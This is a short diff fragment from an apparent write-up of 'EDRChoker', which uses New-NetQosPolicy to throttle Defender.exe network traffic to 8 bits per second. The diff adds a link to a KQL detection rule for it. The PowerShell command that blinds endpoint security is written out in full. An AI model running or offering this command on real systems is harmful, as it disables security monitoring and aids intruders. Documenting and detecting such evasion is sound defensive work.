@@ -7,3 +7,6 @@ EDRChoker operates at the NDIS layer using `New-NetQosPolicy` to create Quality 
 New-NetQosPolicy -Name "policy-name" `
   -AppPathNameMatchCondition "C:\Program Files\...\Defender.exe" `
   -ThrottleRateActionBitsPerSecond 8  # 8 bits/second = death by a thousand timeouts
+
+
+https://github.com/SlimKQL/Detections.AI/blob/main/KQL/edrchoker-detection.kql#L1
